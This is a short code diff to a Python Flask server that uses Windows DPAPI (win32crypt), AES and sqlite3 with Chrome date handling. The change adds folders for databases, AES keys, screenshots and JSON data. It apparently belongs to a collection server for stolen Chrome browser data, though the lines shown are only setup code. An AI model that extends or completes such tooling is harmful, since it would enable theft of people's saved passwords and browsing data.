@@ -2,7 +2,7 @@ import flask
 import time
 import json
 import base64
-import sqlite3
+import sqlite3,os
 import requests
 import win32crypt  # type: ignore
 from Cryptodome.Cipher import AES
@@ -10,6 +10,16 @@ from datetime import datetime, timedelta
 from flask import request
 app = flask.Flask(__name__)
 
+if not os.path.exists("./dbs"):
+    os.makedirs("./dbs")
+if not os.path.exists("./data"):
+    os.makedirs("./data")
+if not os.path.exists("./aesKey"):
+    os.makedirs("./aesKey")
+if not os.path.exists("./screenshots"):
+    os.makedirs("./screenshots")
+if not os.path.exists("./Json"):
+    os.makedirs("./Json")
 
 def chrome_date_and_time(chrome_data):
     # Chrome_data format is 'year-month-date
